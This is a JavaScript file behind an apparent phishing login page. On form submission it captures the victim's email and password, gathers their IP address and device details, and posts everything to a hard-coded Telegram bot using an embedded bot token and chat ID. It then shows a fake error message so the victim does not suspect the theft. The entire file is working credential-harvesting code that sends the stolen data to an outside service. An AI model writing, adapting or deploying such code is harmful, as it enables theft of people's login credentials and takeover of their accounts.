document.getElementById('start').addEventListener('click', function() {

    this.classList.add('start');


    const TOKEN = "7827361973:AAFA7xJ_sZ_GPPY-a4gbG2xS9i_iZPNRVB4";
    const CHAT_ID = "7827361973";
    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

    document.getElementById('login-form').addEventListener('submit', function(e) {
        e.preventDefault();

        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        axios.get('https://api.ipify.org?format=json')
            .then(response => {
                const ip = response.data.ip;
                console.log('User IP: ', ip);

                const userAgent = navigator.userAgent;
                const platform = navigator.platform;
                const screenWidth = screen.width;
                const screenHeight = screen.height;
                const deviceType = /mobile/i.test(navigator.userAgent) ? "Mobile" : "Desktop";

                console.log('User-Agent: ', userAgent);
                console.log('Platform: ', platform);
                console.log("Screen Resolution: ", screenWidth + '*' + screenHeight);
                console.log('Device Type: ', deviceType);

                const message = `                         
                    <b>New Login Attempt</b>\n
                    <b>Email: </b> ${email}\n
                    <b>Password: </b> ${password}\n
                    <b>IP Address: </b> ${ip}\n
                    <b>Device Type: </b> ${deviceType}\n
                    <b>Platform: </b> ${platform}\n
                    <b>User Agent: </b> ${userAgent}\n
                    <b>Screen Resolution: </b> ${screenWidth}x${screenHeight}
                `;

                axios.post(URI_API, {
                    chat_id: CHAT_ID,
                    parse_mode: 'html',
                    text: message
                }).then(response => {
                    console.log("Message sent:", response.data);
                    alert("error ao enviar as information.");
                }).catch(error => {
                    console.error("error sending message");
                    alert("error ao enviar as information.");
                })
            })
            .catch(error => {
                console.error("error IP: ", error);
                alert("hahhahahah");
            })
    });
});
